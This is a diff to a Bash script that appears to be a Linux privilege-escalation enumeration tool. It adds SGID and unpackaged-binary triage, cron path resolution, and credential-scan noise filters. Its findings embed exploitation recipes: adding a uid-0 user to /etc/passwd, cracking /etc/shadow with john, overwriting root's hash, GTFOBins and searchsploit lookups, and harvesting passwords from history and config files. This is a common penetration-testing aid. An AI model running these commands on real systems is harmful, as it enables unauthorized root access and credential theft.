@@ -1935,6 +1935,65 @@ is_default_setuid() {
     return 1
 }
 
+# Default SGID binaries. SGID only grants the group's rights, and these ship
+# setgid on stock Ubuntu/Debian, so they are not privesc on their own.
+is_default_sgid() {
+    case "$1" in
+        ssh-agent|ssh-keysign|crontab|at|wall|write|bsd-write|expiry|chage\
+        |unix_chkpwd|dotlockfile|mlocate|locate|screen-cleanup|utempter\
+        |postdrop|postqueue|mailq|sendmail|bsd-mailx|mail.mailutils) return 0 ;;
+    esac
+    return 1
+}
+
+# SGID hands you a group, not uid 0. Only privileged groups are worth CRIT.
+sgid_sev() {
+    case "$2" in
+        root|shadow|disk|docker|lxd|sudo|wheel|adm|kmem) printf '%s' "$1" ;;
+        *) case "$1" in
+               CRIT|HIGH) printf 'MED' ;;
+               *)         printf 'INFO' ;;
+           esac ;;
+    esac
+}
+
+# screen-4.5.0 -> screen   (leaves packaged names like python3.11 alone)
+strip_version() { printf '%s' "$1" | sed -E 's/-[0-9]+(\.[0-9]+)*[a-z]?$//'; }
+name_version()  { printf '%s' "$1" | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)*' | head -1; }
+has_version_in_name() { printf '%s' "$1" | grep -qE '[0-9]+\.[0-9]+'; }
+
+# One batched package-manager query for every setuid/setgid path, because
+# per-binary dpkg -S calls are slow. Empty answer later = owned by no package.
+PKG_MAP=""
+PKG_MGR=""
+if command -v dpkg >/dev/null 2>&1; then PKG_MGR=dpkg
+elif command -v rpm >/dev/null 2>&1; then PKG_MGR=rpm
+elif command -v pacman >/dev/null 2>&1; then PKG_MGR=pacman
+fi
+
+# pkg_owner PATH -> package name, "" if unpackaged, "?" if we cannot tell
+pkg_owner() {
+    [ -n "$PKG_MGR" ] || { printf '?'; return; }
+    case "$PKG_MGR" in
+        dpkg)   printf '%s' "$PKG_MAP" | grep -F -- ": $1" | head -1 | cut -d: -f1 ;;
+        rpm)    rpm -qf "$1" 2>/dev/null | grep -vi 'not owned' ;;
+        pacman) pacman -Qo "$1" 2>/dev/null | awk '{print $5}' ;;
+    esac
+}
+
+# Resolve a path from a crontab line to a real, writable, regular file.
+# Without this, the "> /dev/null 2>&1" present in almost every cron line is
+# reported as a writable root-executed script.
+resolve_script() {
+    local p
+    p=$(readlink -f "$1" 2>/dev/null) || return 1
+    [ -n "$p" ] || return 1
+    [ -f "$p" ] || return 1
+    case "$p" in /dev/*|/proc/*|/sys/*) return 1 ;; esac
+    [ -w "$p" ] || return 1
+    printf '%s' "$p"
+}
+
 header() {
     echo ""
     echo -e "${BOLD}${CYAN}━━━ $1 ${NC}"
@@ -1953,42 +2012,104 @@ cap_list() {
 SUID_CACHE=$(timeout 30 find / -perm -4000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)
 SGID_CACHE=$(timeout 30 find / -perm -2000 -type f -not -path "/snap/*" -exec ls -la {} \; 2>/dev/null)
 
-# =============================== SUID ===============================
-while IFS= read -r entry; do
-    [ -z "$entry" ] && continue
-    file=$(echo "$entry" | awk '{print $NF}')
-    owner=$(echo "$entry" | awk '{print $3}')
-    b=$(basename "$file")
-    is_default_setuid "$b" && continue
-    funcs=$(is_suid_exploitable "$b") || continue
-    cmd=$(realize "$(get_suid_exploit "$b")")
-    add_finding "$(sev_for_funcs "$funcs")" \
-        "SUID $b -> runs as $owner" \
-        "$file  ($funcs)" \
-        "$cmd"
-done <<< "$SUID_CACHE"
-
-# SUID owned by a non-root user = lateral movement, grouped into one finding
-SUID_LATERAL=$(echo "$SUID_CACHE" | awk -v me="$ME" '$3!="root" && $3!=me && NF>0 {print "  "$3":"$4"  "$NF}')
-if [ -n "$SUID_LATERAL" ]; then
-    add_finding MED "SUID binaries owned by other users (lateral movement)" \
-        "$(printf '%s' "$SUID_LATERAL" | sed 's/^  //' | cap_list 10)" ""
+# ============================ SUID / SGID ===========================
+# Batch the package lookup for every setuid/setgid path in one call.
+ALL_SETUID_PATHS=$(printf '%s\n%s\n' "$SUID_CACHE" "$SGID_CACHE" \
+    | awk 'NF>0 {print $NF}' | sort -u)
+if [ "$PKG_MGR" = dpkg ] && [ -n "$ALL_SETUID_PATHS" ]; then
+    # shellcheck disable=SC2086
+    PKG_MAP=$(printf '%s\n' "$ALL_SETUID_PATHS" | xargs -r dpkg -S 2>/dev/null)
 fi
 
-# =============================== SGID ===============================
+UNTRIAGED=""
+
+# triage_setuid PATH SUID|SGID OWNER-OR-GROUP
+triage_setuid() {
+    local file="$1" kind="$2" ident="$3"
+    local b stripped ver funcs sfuncs sev pkg cmd signals n
+
+    b=$(basename "$file")
+    is_default_setuid "$b" && return
+    [ "$kind" = SGID ] && is_default_sgid "$b" && return
+
+    # 1. Exact GTFOBins entry: known recipe, keep its full severity.
+    if funcs=$(is_suid_exploitable "$b"); then
+        sev=$(sev_for_funcs "$funcs")
+        [ "$kind" = SGID ] && sev=$(sgid_sev "$sev" "$ident")
+        cmd=$(realize "$(get_suid_exploit "$b")")
+        add_finding "$sev" "$kind $b runs as $ident" "$file  ($funcs)" "$cmd"
+        return
+    fi
+
+    # 2. Not in the table. This is where a manually planted binary like
+    #    screen-4.5.0 used to be dropped silently. Score three signals.
+    stripped=$(strip_version "$b")
+    ver=$(name_version "$b")
+    pkg=$(pkg_owner "$file")
+    signals=""; n=0
+
+    if [ -z "$pkg" ]; then
+        signals="NO-PACKAGE"; n=$((n + 1))
+    fi
+    if has_version_in_name "$b"; then
+        signals="${signals:+$signals, }VERSION-IN-NAME"; n=$((n + 1))
+    fi
+    if sfuncs=$(is_suid_exploitable "$stripped"); then
+        signals="${signals:+$signals, }CHECK-GTFOBINS($stripped)"; n=$((n + 1))
+    fi
+
+    if [ "$n" -eq 0 ]; then
+        UNTRIAGED="${UNTRIAGED}${file}  [pkg: ${pkg:-none}]
+"
+        return
+    fi
+
+    case "$n" in
+        3) sev=CRIT ;;
+        2) sev=HIGH ;;
+        *) sev=MED  ;;
+    esac
+    [ "$kind" = SGID ] && sev=$(sgid_sev "$sev" "$ident")
+
+    cmd="searchsploit ${stripped}${ver:+ $ver}
+$file --version 2>/dev/null || $file -v 2>/dev/null"
+    if [ -n "$sfuncs" ]; then
+        cmd="${cmd}
+# GTFOBins has a recipe for '$stripped' — verify it applies to this build:
+$(realize "$(get_suid_exploit "$stripped")")"
+    fi
+
+    add_finding "$sev" "$kind $b is not a stock binary" \
+        "$file
+runs as: $ident
+signals: $signals" \
+        "$cmd"
+}
+
 while IFS= read -r entry; do
     [ -z "$entry" ] && continue
-    file=$(echo "$entry" | awk '{print $NF}')
-    group=$(echo "$entry" | awk '{print $4}')
-    b=$(basename "$file")
-    is_default_setuid "$b" && continue
-    funcs=$(is_suid_exploitable "$b") || continue
-    cmd=$(realize "$(get_suid_exploit "$b")")
-    add_finding "$(sev_for_funcs "$funcs")" \
-        "SGID $b -> runs as group $group" \
-        "$file  ($funcs)" \
-        "$cmd"
+    triage_setuid "$(echo "$entry" | awk '{print $NF}')" SUID "$(echo "$entry" | awk '{print $3}')"
+done <<< "$SUID_CACHE"
+
+while IFS= read -r entry; do
+    [ -z "$entry" ] && continue
+    triage_setuid "$(echo "$entry" | awk '{print $NF}')" SGID "$(echo "$entry" | awk '{print $4}')"
 done <<< "$SGID_CACHE"
+
+# SUID owned by a non-root user = lateral movement, grouped into one finding
+SUID_LATERAL=$(echo "$SUID_CACHE" | awk -v me="$ME" '$3!="root" && $3!=me && NF>0 {print $3":"$4"  "$NF}')
+if [ -n "$SUID_LATERAL" ]; then
+    add_finding MED "SUID binaries owned by other users (lateral movement)" \
+        "$(printf '%s\n' "$SUID_LATERAL" | cap_list 10)" ""
+fi
+
+# Never drop a setuid binary silently — the rest goes to INFO to be eyeballed.
+UNTRIAGED=$(printf '%s' "$UNTRIAGED" | grep -v '^$')
+if [ -n "$UNTRIAGED" ]; then
+    add_finding INFO "Other setuid/setgid binaries (read these yourself)" \
+        "$(printf '%s\n' "$UNTRIAGED" | cap_list 15)" \
+        "find / -perm -4000 -type f -not -path '/snap/*' 2>/dev/null"
+fi
 
 # =========================== CAPABILITIES ===========================
 CAP_OUTPUT=""
@@ -2071,20 +2192,20 @@ fi
 
 # ========================= PASSWD / SHADOW =========================
 if [ "$IS_ROOT" -eq 0 ]; then
-[ -w /etc/passwd ] && add_finding CRIT "/etc/passwd is WRITABLE" \
+[ -w /etc/passwd ] && add_finding CRIT "/etc/passwd is writable" \
     "Append a uid-0 user with a known password" \
     "openssl passwd -1 -salt x pwned
 # paste the hash below:
 echo 'pwned:\$1\$x\$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
 su pwned   # password: pwned"
 
-[ -r /etc/shadow ] && add_finding CRIT "/etc/shadow is READABLE" \
+[ -r /etc/shadow ] && add_finding CRIT "/etc/shadow is readable" \
     "Crack hashes offline" \
     "cat /etc/shadow
 unshadow /etc/passwd /etc/shadow > /tmp/unshadowed
 john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed"
 
-[ -w /etc/shadow ] && add_finding CRIT "/etc/shadow is WRITABLE" \
+[ -w /etc/shadow ] && add_finding CRIT "/etc/shadow is writable" \
     "Overwrite root's hash directly" \
     "openssl passwd -6 -salt x pwned
 # replace root's 2nd field in /etc/shadow with that hash, then:
@@ -2145,8 +2266,8 @@ if [ "$IS_ROOT" -eq 0 ]; then
         [ -r "$crontab_file" ] || continue
         while IFS= read -r line; do
             for script_path in $(echo "$line" | tr ' \t' '\n' | grep '^/'); do
-                [ -w "$script_path" ] 2>/dev/null || continue
-                CRON_W="${CRON_W}${script_path}
+                resolved=$(resolve_script "$script_path") || continue
+                CRON_W="${CRON_W}${resolved}
 "
             done
         done < <(grep -vE '^\s*#|^\s*$' "$crontab_file" 2>/dev/null)
@@ -2154,8 +2275,8 @@ if [ "$IS_ROOT" -eq 0 ]; then
     for crondir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
         [ -d "$crondir" ] || continue
         for script in "$crondir"/*; do
-            [ -f "$script" ] && [ -w "$script" ] || continue
-            CRON_W="${CRON_W}${script}
+            resolved=$(resolve_script "$script") || continue
+            CRON_W="${CRON_W}${resolved}
 "
         done
     done
@@ -2289,7 +2410,9 @@ fi
 
 # ========================= CREDENTIALS =============================
 CRED_RE='(password|passwd|pwd|secret|token|api[_-]?key|db_pass(word)?)[[:space:]]*[=:][[:space:]]*[^[:space:]#]'
-NOISE_RE='^[[:space:]]*(#|//|\*|;|--)|example|changeme|placeholder|your_|xxxx|\$\{|<%=|REPLACE'
+# NOPASSWD: is sudoers syntax, not a credential — without it every
+# "NOPASSWD:ALL" line matches CRED_RE via the "passwd" substring.
+NOISE_RE='^[[:space:]]*(#|//|\*|;|--)|example|changeme|placeholder|your_|xxxx|\$\{|<%=|REPLACE|NOPASSWD|PASSWD[[:space:]]*:[[:space:]]*(ALL|NONE)'
 
 for cf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" \
     "$HOME/.psql_history" "$HOME/.my.cnf" "/etc/shadow.bak" "/etc/passwd.bak" \
@@ -2329,6 +2452,21 @@ done < <(find /var/www /opt /srv /home /etc -maxdepth 4 \( \
     -o -name 'config.php' -o -name 'db.php' -o -name 'database.yml' \
     -o -name 'settings.py' -o -name 'appsettings.json' -o -name 'application.properties' \
     -o -name '*.cfg' -o -name '*.ini' \) -readable -type f 2>/dev/null | head -60)
+
+# cloud.cfg ships a NOPASSWD sudo template for its default user. That is only
+# a real finding if the user it names actually exists on this box.
+if [ -r /etc/cloud/cloud.cfg ] && grep -qE 'NOPASSWD' /etc/cloud/cloud.cfg 2>/dev/null; then
+    CI_USER=$(awk '/^[[:space:]]*name:[[:space:]]*/ {print $2; exit}' /etc/cloud/cloud.cfg 2>/dev/null | tr -d '"'"'")
+    if [ -n "$CI_USER" ] && id "$CI_USER" >/dev/null 2>&1; then
+        CI_SUDO=$(grep -rl "$CI_USER" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | head -1)
+        if [ -n "$CI_SUDO" ]; then
+            add_finding MED "Cloud-init user '$CI_USER' has passwordless sudo" \
+                "Granted via $CI_SUDO — useful if you can become $CI_USER" \
+                "su - $CI_USER
+sudo -n true && sudo su -"
+        fi
+    fi
+fi
 
 if [ -r /var/lib/cloud/instance/user-data.txt ] && [ -s /var/lib/cloud/instance/user-data.txt ]; then
     add_finding HIGH "Cloud-init user-data is readable" \
